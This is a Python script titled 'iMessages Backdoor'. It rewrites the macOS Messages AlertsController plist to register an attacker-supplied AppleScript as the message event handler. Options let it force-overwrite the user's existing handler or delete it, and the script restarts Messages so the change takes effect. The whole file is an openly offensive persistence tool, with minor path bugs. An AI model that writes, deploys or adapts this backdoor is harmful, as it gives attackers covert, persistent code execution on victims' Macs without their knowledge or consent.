import subprocess
import os
import plistlib as PL
import sys
import argparse
import platform

#Argument Parsing
parser = argparse.ArgumentParser(description='iMessages Backdoor')
parser.add_argument('-plist', type=str, help='The name of the applescript file that will be stored in the iMessages configuration file.')
parser.add_argument('--force', help='Force overwriting of the users current applescript event handler', action='store_true')
parser.add_argument('--delete', help='Delete the current script handler and quit execution.', action='store_true')
parser.add_argument('--verbose', help='Display debugging messages.', action='store_true')
arguments = parser.parse_args()

#Add a kill for the messages application.
#Initial environment information gathering.
homedir = os.path.expanduser('~')
scriptspath = None
currentScript = ""

#Check version of OSX we're running
#~/Library/Application Scripts/Com.apple.iChat for any macs newer than 10.7
#~/Library/Scripts/Messages for any macs 10.7 and older.
macversion = platform.mac_ver()[0].split(".")
print "[INFO] Running Mac OSX " + macversion[0] + "." + macversion[1] + "." + macversion[2]
if int(macversion[0]) == 10 and int(macversion[1]) <= 7:
    scriptspath = homedir + "/Library/Scripts/Messages/"
    print "[INFO] Using scripts path: " + scriptspath
elif int(macversion[0]) == 10 and int(macversion[1]) == 12:
    scriptspath = homedir + "Library/Application Scripts/Com.apple.iChat/"
    print "[INFO] Using scripts path: " + scriptspath


#--------------------------------------------------------------------------------------------------------
#Convert the file into a readable format. I wonder if this is required with plistlib
#Import the plist file so that it can be modified.
#--------------------------------------------------------------------------------------------------------
try:
    subprocess.Popen("plutil -convert xml1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
    alertsPlist = PL.readPlist(homedir+'/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist')
except:
    print "[ERROR] Could not read the AlertsController plist!"
    quit()

if arguments.verbose == True:
    with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
        print fin.read()

#-------------------------------------------------------------------------------------------------------- 
# Try to read AppleScriptNameKey value.
#-------------------------------------------------------------------------------------------------------- 
try:
    currentScript = alertsPlist["AppleScriptNameKey"]
except:
    #An exception could potentially mean the key just doesn't exist. To Do: Clean this check up.
    pass
 
  
#-------------------------------------------------------------------------------------------------------- 
# Check if AppleScriptNameKey exists or not. If it does exist...
#--------------------------------------------------------------------------------------------------------  
if currentScript:
    print "[INFO] There is currently an AppleScriptNameKey set and its value is: " + str(currentScript)
    #Delete and quit.
#-------------------------------------------------------------------------------------------------------- 
# Check if the --delete flag is set. If it is, delete the key and write the plist file.
#--------------------------------------------------------------------------------------------------------  
    if arguments.delete==True:
        #delete
        print "Removing the AppleScriptNameKey from the plist..."
        del alertsPlist["AppleScriptNameKey"]
        print "Writing new plist file to the Preferences directory..."
        PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
        #------------------------------------------------------------------------------------------------
        #Verbose check.
        #------------------------------------------------------------------------------------------------
        if arguments.verbose == True:
            with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
                print fin.read()
        subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
        exit()
#-------------------------------------------------------------------------------------------------------- 
# Check if the --force flag is set. If it is, overwrite the current key with the new value.
#--------------------------------------------------------------------------------------------------------   
    elif arguments.force == True:
        print "[+] Removing the users current script and replacing it with our own..."
        alertsPlist["AppleScriptNameKey"] = str(arguments.plist)
        PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
        #------------------------------------------------------------------------------------------------
        #Verbose check.
        #------------------------------------------------------------------------------------------------
        if arguments.verbose == True:
            with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
                print fin.read()
#-------------------------------------------------------------------------------------------------------- 
# If the --force flag is not set, display a message and exit.
#--------------------------------------------------------------------------------------------------------  
    else:
        print "[STOP] There is already a value set for AppleScriptNameKey use the --force option to change that value."
        print "[+] Converting the plist back into binary..."
        subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
        quit() 
#-------------------------------------------------------------------------------------------------------- 
# If AppleScriptNameKey does not already exist...
#--------------------------------------------------------------------------------------------------------   
elif currentScript == "":
    print "[INFO] No current AppleScriptNameKey value"
    alertsPlist["AppleScriptNameKey"] = arguments.plist
    PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
    #------------------------------------------------------------------------------------------------
    #Verbose check.
    #------------------------------------------------------------------------------------------------
    if arguments.verbose == True:
        with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
            print fin.read()
    
#Restart Messages.app
print "[+] Converting the plist back into binary..."
subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()

print "[+] Restarting Messages.app"
subprocess.Popen("killall messages", shell=True, stdout=subprocess.PIPE).stdout.read()

